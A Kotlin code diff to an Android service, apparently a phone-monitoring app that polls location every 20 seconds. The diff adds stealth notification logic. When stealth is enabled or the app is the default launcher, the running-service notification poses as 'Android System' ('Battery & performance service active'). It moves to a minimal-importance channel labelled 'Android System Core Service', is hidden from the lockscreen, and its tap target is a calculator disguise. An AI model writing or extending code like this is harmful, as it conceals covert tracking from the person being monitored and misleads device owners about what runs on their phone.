@@ -1537,10 +1537,23 @@ class PhoneLinkService : Service() {
         }
     }
 
+    private fun isDefaultLauncherActive(): Boolean {
+        return try {
+            val intent = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_HOME)
+            val resolveInfo = packageManager.resolveActivity(intent, android.content.pm.PackageManager.MATCH_DEFAULT_ONLY)
+            resolveInfo?.activityInfo?.packageName == packageName
+        } catch (e: Exception) {
+            false
+        }
+    }
+
     private var lastNotifiedState: String? = null
 
     private fun buildNotification(text: String): Notification {
-        val isStealth = DevicePrefs.stealthNotificationEnabled
+        val isDefaultHome = isDefaultLauncherActive()
+        val isStealth = DevicePrefs.stealthNotificationEnabled || isDefaultHome
+        val activeChannelId = if (isStealth) CHANNEL_ID_MINIMAL else CHANNEL_ID
+
         val intent = if (isStealth || DevicePrefs.calculatorDisguiseEnabled) {
             Intent(this, com.phonelink.hub.calculator.CalculatorActivity::class.java).apply {
                 flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
@@ -1569,7 +1582,7 @@ class PhoneLinkService : Service() {
         val notifTitle = if (isStealth) "Android System" else getString(R.string.app_name)
         val notifText = if (isStealth) "Battery & performance service active" else statusText
 
-        return NotificationCompat.Builder(this, CHANNEL_ID)
+        return NotificationCompat.Builder(this, activeChannelId)
             .setContentTitle(notifTitle)
             .setContentText(notifText)
             .setSmallIcon(R.drawable.ic_notification_minimal)
@@ -1577,14 +1590,18 @@ class PhoneLinkService : Service() {
             .setOnlyAlertOnce(true)
             .setSilent(true)
             .setContentIntent(pi)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(if (isStealth) NotificationCompat.PRIORITY_MIN else NotificationCompat.PRIORITY_LOW)
+            .setVisibility(if (isStealth) NotificationCompat.VISIBILITY_SECRET else NotificationCompat.VISIBILITY_PRIVATE)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setShowWhen(false)
             .build()
     }
 
     private fun buildFallbackNotification(text: String): Notification {
-        val isStealth = DevicePrefs.stealthNotificationEnabled
+        val isDefaultHome = isDefaultLauncherActive()
+        val isStealth = DevicePrefs.stealthNotificationEnabled || isDefaultHome
+        val activeChannelId = if (isStealth) CHANNEL_ID_MINIMAL else CHANNEL_ID
+
         val intent = if (isStealth || DevicePrefs.calculatorDisguiseEnabled) {
             Intent(this, com.phonelink.hub.calculator.CalculatorActivity::class.java).apply {
                 flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
@@ -1603,7 +1620,7 @@ class PhoneLinkService : Service() {
         val notifTitle = if (isStealth) "Android System" else getString(R.string.app_name)
         val notifText = if (isStealth) "Battery & performance service active" else text
 
-        return NotificationCompat.Builder(this, CHANNEL_ID)
+        return NotificationCompat.Builder(this, activeChannelId)
             .setContentTitle(notifTitle)
             .setContentText(notifText)
             .setSmallIcon(R.drawable.ic_notification_minimal)
@@ -1611,7 +1628,8 @@ class PhoneLinkService : Service() {
             .setOnlyAlertOnce(true)
             .setSilent(true)
             .setContentIntent(pi)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(if (isStealth) NotificationCompat.PRIORITY_MIN else NotificationCompat.PRIORITY_LOW)
+            .setVisibility(if (isStealth) NotificationCompat.VISIBILITY_SECRET else NotificationCompat.VISIBILITY_PRIVATE)
             .build()
     }
 
@@ -1636,6 +1654,8 @@ class PhoneLinkService : Service() {
     }
 
     private fun createChannel() {
+        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+
         val channel = NotificationChannel(
             CHANNEL_ID,
             getString(R.string.notification_channel_name),
@@ -1647,8 +1667,21 @@ class PhoneLinkService : Service() {
             enableVibration(false)
             enableLights(false)
         }
-        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
         manager.createNotificationChannel(channel)
+
+        val silentChannel = NotificationChannel(
+            CHANNEL_ID_MINIMAL,
+            "System Performance",
+            NotificationManager.IMPORTANCE_MIN
+        ).apply {
+            description = "Android System Core Service"
+            setShowBadge(false)
+            setSound(null, null)
+            enableVibration(false)
+            enableLights(false)
+            lockscreenVisibility = Notification.VISIBILITY_SECRET
+        }
+        manager.createNotificationChannel(silentChannel)
     }
 
     private fun toArray(items: List<JSONObject>) = org.json.JSONArray().apply { items.forEach { put(it) } }
@@ -1656,6 +1689,7 @@ class PhoneLinkService : Service() {
     companion object {
         private const val TAG = "PhoneLinkService"
         private const val CHANNEL_ID = "phonelink_service"
+        private const val CHANNEL_ID_MINIMAL = "phonelink_service_silent"
         private const val NOTIFICATION_ID = 4201
         private const val LOCATION_INTERVAL_MS = 20_000L
         private const val PERIODIC_SYNC_MS = 45_000L
